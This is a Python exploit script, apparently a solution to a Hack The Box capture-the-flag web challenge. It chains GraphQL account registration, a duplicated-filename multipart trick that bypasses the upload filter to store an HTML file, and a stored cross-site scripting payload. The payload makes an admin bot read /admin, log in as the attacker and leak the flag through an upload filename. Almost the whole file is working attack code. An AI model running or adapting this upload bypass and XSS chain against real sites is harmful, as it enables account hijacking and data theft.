import requests
import json
import random
import time

BASE_URL = "http://83.136.249.34:34017"
GRAPHQL_URL = f"{BASE_URL}/graphql"
UPLOAD_URL = f"{BASE_URL}/upload"
FILES_URL = f"{BASE_URL}/files"

session = requests.Session()

def graphql_query(query, variables=None):
    response = session.post(GRAPHQL_URL, json={'query': query, 'variables': variables})
    return response.json()

def register_random(rand_id):
    print(f"[*] Registering user {rand_id}...")
    query = """
    mutation Register($email: String!, $password: String!) {
        register(email: $email, password: $password) {
            id
            email
            inviteCode
        }
    }
    """
    variables = {
        "email": f"hacker{rand_id}@blackouts.htb",
        "password": "password123"
    }
    data = graphql_query(query, variables)
    if 'errors' in data:
        print("[-] Registration failed:", data['errors'])
        return None
    return data['data']['register']

def login(email):
    print("[*] Logging in...")
    query = """
    mutation Login($email: String!, $password: String!) {
        login(email: $email, password: $password) {
            id
            email
            verified
        }
    }
    """
    variables = {
        "email": email,
        "password": "password123"
    }
    data = graphql_query(query, variables)
    if 'errors' in data:
        print("[-] Login failed:", data['errors'])
        return False
    return True

def verify(invite_code):
    print(f"[*] Verifying account with code {invite_code}...")
    query = """
    mutation Verify($code: String!) {
        verifyAccount(inviteCode: $code) {
            verified
        }
    }
    """
    variables = {
        "code": invite_code
    }
    data = graphql_query(query, variables)
    if 'errors' in data:
        print("[-] Verification failed:", data['errors'])
        return False
    return data['data']['verifyAccount']['verified']

def upload_bypass(filename_payload, content):
    print(f"[*] Uploading with payload: {filename_payload}")
    boundary = "---------------------------1234567890"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; {filename_payload}\r\n'
        "Content-Type: text/html\r\n"
        "\r\n"
        f"{content}\r\n"
        f"--{boundary}--\r\n"
    )
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}"
    }
    response = session.post(UPLOAD_URL, data=body, headers=headers)
    print(f"[*] Upload response: {response.status_code} {response.text}")
    return response.status_code == 200

def check_file(filename):
    url = f"{FILES_URL}/{filename}"
    print(f"[*] Checking {url}...")
    response = requests.get(url)
    if response.status_code == 200:
        print(f"[+] File found! Content: {response.text}")
        return True
    else:
        print(f"[-] File not found: {response.status_code}")
        return False

def submit_incident_report(evidence_url):
    print(f"[*] Submitting incident report with evidence: {evidence_url}...")
    query = """
    mutation SubmitIncidentReport($title: String!, $details: String!, $evidenceUrl: String) {
        submitIncidentReport(title: $title, details: $details, evidenceUrl: $evidenceUrl) {
            id
            status
        }
    }
    """
    variables = {
        "title": "Hacked",
        "details": "Check this out",
        "evidenceUrl": evidence_url
    }
    data = graphql_query(query, variables)
    if 'errors' in data:
        print("[-] Submission failed:", data['errors'])
        return None
    return data['data']['submitIncidentReport']

def main():
    rand_id = random.randint(1000, 9999)
    user = register_random(rand_id)
    if not user:
        return

    invite_code = user['inviteCode']
    email = user['email']
    
    if not login(email):
        return
        
    if not verify(invite_code):
        return
        
    print("[+] Account verified!")
    
    # Payload 1: Duplicate filename
    filename = f"exploit_{rand_id}.html"
    payload = f'filename="test.jpg"; filename="{filename}"'
    
    xss_payload = f"""
    <script>
    const attackerEmail = "{email}";
    const attackerPassword = "password123";
    
    async function pwn() {{
        try {{
            // 1. Get Flag
            const r = await fetch('/admin');
            const text = await r.text();
            const match = text.match(/HTB{{.*?}}/);
            if (!match) return;
            const flag = match[0];
            
            // 2. Logout
            await fetch('/logout');
            
            // 3. Login as attacker
            const loginQuery = {{
                query: `mutation Login($email: String!, $password: String!) {{ login(email: $email, password: $password) {{ id }} }}` ,
                variables: {{ email: attackerEmail, password: attackerPassword }}
            }};
            
            await fetch('/graphql', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(loginQuery)
            }});
            
            // 4. Upload file with flag as filename
            const formData = new FormData();
            formData.append('file', new Blob(['pwned']), flag + ".txt");
            
            await fetch('/upload', {{
                method: 'POST',
                body: formData
            }});
        }} catch (e) {{
            console.error(e);
        }}
    }}
    
    pwn();
    </script>
    """
    
    if upload_bypass(payload, xss_payload):
        if check_file(filename):
            evidence_url = f"http://127.0.0.1:3000/files/{filename}"
            submit_incident_report(evidence_url)
            
            print("[*] Waiting for bot...")
            time.sleep(10)
            
            print("[*] Checking uploads for flag...")
            query = """
            query {
                uploads {
                    filename
                }
            }
            """
            data = graphql_query(query)
            if 'data' in data and 'uploads' in data['data']:
                for upload in data['data']['uploads']:
                    print(f"Found upload: {upload['filename']}")
                    if "HTB{" in upload['filename']:
                        print(f"[+] FLAG FOUND: {upload['filename']}")
                        return

if __name__ == "__main__":
    main()
